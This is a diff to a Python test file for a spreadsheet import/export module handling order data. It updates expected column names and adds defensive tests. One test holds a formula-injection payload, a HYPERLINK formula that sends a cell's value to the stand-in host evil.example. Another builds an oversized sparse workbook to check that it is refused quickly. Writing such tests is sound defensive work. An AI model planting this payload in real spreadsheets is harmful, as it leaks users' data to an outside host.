@@ -44,9 +44,9 @@ def test_read_xlsx_header_detection_empty_rows_duplicates():
     sheets = sheet_io.read_workbook(data, "orders.xlsx")
     assert [s.name for s in sheets] == ["订单", "空表"]
     s = sheets[0]
-    assert s.headers == ["平台订单号", "ASIN", "ASIN (2)", "第4列", "数量", "邮编"]
+    assert s.headers == ["平台订单号", "ASIN", "ASIN (2)", "第 4 列", "数量", "邮编"]
     assert s.row_numbers == [4, 7]
-    assert s.rows[0] == {"平台订单号": "PO-DEMO-1", "ASIN": "B0DEMO0001", "ASIN (2)": "x", "第4列": "孤列值",
+    assert s.rows[0] == {"平台订单号": "PO-DEMO-1", "ASIN": "B0DEMO0001", "ASIN (2)": "x", "第 4 列": "孤列值",
                          "数量": 1, "邮编": "02134"}
     assert s.rows[1]["邮编"] == 32960 and s.rows[1]["数量"] == 2
     assert sheets[1].headers == [] and sheets[1].rows == []
@@ -102,8 +102,8 @@ def test_read_csv_tab_and_semicolon_and_quotes():
 def test_read_csv_duplicate_headers_and_ragged_rows():
     text = "ASIN,ASIN,数量\nB0DEMO0001,B0DEMO0009,1,多出来的值\nB0DEMO0002\n"
     s = sheet_io.read_workbook(text.encode(), "d.csv")[0]
-    assert s.headers == ["ASIN", "ASIN (2)", "数量", "第4列"]
-    assert s.rows[1] == {"ASIN": "B0DEMO0002", "ASIN (2)": None, "数量": None, "第4列": None}
+    assert s.headers == ["ASIN", "ASIN (2)", "数量", "第 4 列"]
+    assert s.rows[1] == {"ASIN": "B0DEMO0002", "ASIN (2)": None, "数量": None, "第 4 列": None}
 
 
 # ── 拒绝 ─────────────────────────────────────────────────────────────────────
@@ -189,3 +189,39 @@ def test_row_cap(monkeypatch):
     data = make_xlsx({"S1": [["h"], ["a"], ["b"]], "S2": [["h"], ["c"], ["d"]]})   # 额度跨工作表累计
     with pytest.raises(errors.DomainError):
         sheet_io.read_workbook(data, "multi.xlsx")
+
+
+def test_write_xlsx_never_writes_formulas_from_headers_or_values():
+    """上传文件的表头 / 内容以「=」开头：写出的 xlsx（问题行、导出）里不得出现公式元素。"""
+    import zipfile
+
+    evil = '=HYPERLINK("http://evil.example/?"&A2,"click")'
+    data = sheet_io.write_xlsx([("问题行", ["平台订单号", evil], [{"平台订单号": "=1+1", evil: "=SUM(A1:A2)"}])])
+    with zipfile.ZipFile(io.BytesIO(data)) as z:
+        sheet = z.read("xl/worksheets/sheet1.xml").decode("utf-8")
+    assert "<f>" not in sheet and "<f " not in sheet
+    wb = openpyxl.load_workbook(io.BytesIO(data))
+    assert wb.active["B1"].value == evil and wb.active["A2"].value == "=1+1"
+
+
+def test_wide_sparse_rows_are_refused_quickly():
+    """15 KB 的文件、每行一格写在 XFD 列：不再把每行撑成 16384 列，而是直接拒绝。"""
+    import time
+
+    wb = openpyxl.Workbook()
+    ws = wb.active
+    ws.append(["平台订单号", "ASIN"])
+    for i in range(2, 2002):
+        ws.cell(row=i, column=16384, value="x")
+    buf = io.BytesIO()
+    wb.save(buf)
+    t0 = time.monotonic()
+    with pytest.raises(errors.DomainError) as e:
+        sheet_io.read_workbook(buf.getvalue(), "wide.xlsx")
+    assert "列" in e.value.message and time.monotonic() - t0 < 2
+    # 行尾的空单元格不算列数
+    ok = make_xlsx({"S": [["平台订单号", "ASIN"] + [None] * 600, ["PO-DEMO-1", "B0DEMO0001"]]})
+    assert sheet_io.read_workbook(ok, "ok.xlsx")[0].headers == ["平台订单号", "ASIN"]
+    wide_csv = ("平台订单号" + ",x" * 600 + "\n").encode("utf-8")
+    with pytest.raises(errors.DomainError):
+        sheet_io.read_workbook(wide_csv, "wide.csv")
